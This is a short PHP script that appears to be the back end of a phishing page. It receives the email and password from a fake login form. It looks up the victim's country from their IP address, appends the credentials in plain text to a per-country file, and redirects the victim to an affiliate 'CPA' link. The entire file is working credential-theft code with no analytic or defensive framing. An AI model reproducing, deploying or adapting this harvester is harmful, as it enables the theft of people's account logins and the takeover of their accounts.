<?php

set_time_limit(0);
header('Access-Control-Allow-Origin: *');

/* CARPETA */
$carpeta = 'datos';

/* LINK CPA */
$cpa = 'https://classwindscreensemi.com/aw9a1diu9i?key=1cda157be6fc8ced72f55289f9237865';

if(isset($_POST['login'])){
    
	$array = [
		'HTTP_CLIENT_IP',
		'HTTP_X_FORWARDED_FOR',
		'HTTP_X_FORWARDED',
		'HTTP_X_CLUSTER_CLIENT_IP',
		'HTTP_FORWARDED_FOR',
		'HTTP_FORWARDED',
		'REMOTE_ADDR'
	];
	
	foreach($array as $key){
		if(array_key_exists($key, $_SERVER) === true){
			foreach(explode(',', $_SERVER[$key]) as $explode){
				if(filter_var($explode, FILTER_VALIDATE_IP) !== false){
					$ip = $explode;
				}
			}
		}
	}
	
	if(isset($ip) && !empty($ip)){
		
		require_once('geoiploc.php');
		
		$pais = getCountryFromIP($ip, 'NamE');
		
		$email = isset($_POST['email']) ? $_POST['email'] : '';
		$pass = isset($_POST['pass']) ? $_POST['pass'] : '';
		
		if(!empty($email) && !empty($pass)){
			
			if(!file_exists($carpeta)){
				mkdir($carpeta, 0755, true);
			}

			$datos = trim($email).'|'.trim($pass).PHP_EOL;
			file_put_contents($carpeta.'/'.$pais.'.txt', $datos, FILE_APPEND);
			
		}
		
	}
	
}

header('Location: '.$cpa);

?>
